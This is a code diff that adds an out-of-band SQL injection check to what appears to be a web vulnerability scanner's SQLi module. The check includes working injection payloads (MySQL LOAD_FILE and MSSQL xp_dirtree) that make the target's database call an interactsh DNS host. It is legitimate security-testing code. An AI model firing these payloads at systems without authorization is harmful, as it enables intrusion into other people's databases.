@@ -120,6 +120,37 @@ class SqliModule(BaseModule):
     NAME        = "sqli"
     DESCRIPTION = "SQL Injection — error, blind, time-based, POST, JSON, headers"
 
+    def _test_oob_sqli(self):
+        """Out-of-band SQLi via DNS callback."""
+        try:
+            from core.interactsh import OOBDetector
+            oob = OOBDetector()
+            host = oob.get_host()
+            oob_payloads = [
+                f"' AND LOAD_FILE(CONCAT('//','{host}','/a'))--",
+                f"'; EXEC master..xp_dirtree '//{host}/a'--",
+                f"' UNION SELECT LOAD_FILE(CONCAT('//','{host}','/a'))--",
+            ]
+            parsed = urlparse(self.url)
+            params = parse_qs(parsed.query)
+            if not params:
+                params = {"id": ["1"]}
+            for param, vals in list(params.items())[:3]:
+                for payload in oob_payloads[:2]:
+                    self.get(self.url.split("?")[0], params={param: payload})
+            result = oob.check(wait=5)
+            if result.get("has_hit"):
+                self.add_finding(
+                    title="Out-of-Band SQL Injection — DNS Callback Confirmed",
+                    severity="CRITICAL",
+                    description="Blind OOB SQLi confirmed via DNS callback. Server made DNS request to attacker-controlled host.",
+                    evidence="OOB host: " + str(host) + " | DNS callback received",
+                    remediation="Use parameterized queries. Block outbound DNS from database server.",
+                    url=self.url, cve="CWE-89")
+            oob.stop()
+        except Exception:
+            pass
+
     def run(self):
         self.log("Testing SQL injection vectors...")
 
@@ -137,6 +168,8 @@ class SqliModule(BaseModule):
         if not self.findings:
             self._test_blind()
 
+        # OOB SQLi via DNS - uses interactsh
+        self._test_oob_sqli()
         self.log(f"SQLi scan complete — {len(self.findings)} findings", "+")
         return self.result()
 
